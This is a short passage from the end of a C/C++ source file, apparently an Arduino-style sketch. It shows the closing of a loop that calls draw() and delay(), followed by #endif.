      }
      draw();
      delay(150);
    }
    delay(50);
  }
}

#endif